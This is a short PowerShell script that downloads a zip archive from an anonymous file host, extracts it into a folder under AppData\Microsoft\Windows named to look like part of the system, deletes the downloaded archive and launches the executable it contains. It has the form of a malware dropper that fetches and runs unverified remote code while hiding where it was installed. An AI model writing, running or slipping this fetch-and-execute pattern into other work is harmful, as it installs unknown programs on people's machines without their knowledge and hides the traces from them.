$folder = "$env:APPDATA\Microsoft\Windows\Hadestoolv2"
if (!(Test-Path $folder)) { New-Item -ItemType Directory -Path $folder -Force | Out-Null }

$zipUrl = "https://files.catbox.moe/zvd84i.zip"
$zipPath = "$env:TEMP\app.zip"

Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
Expand-Archive -Path $zipPath -DestinationPath $folder -Force
Remove-Item $zipPath -ErrorAction SilentlyContinue

Start-Process "$folder\Hadestoolv2.exe"
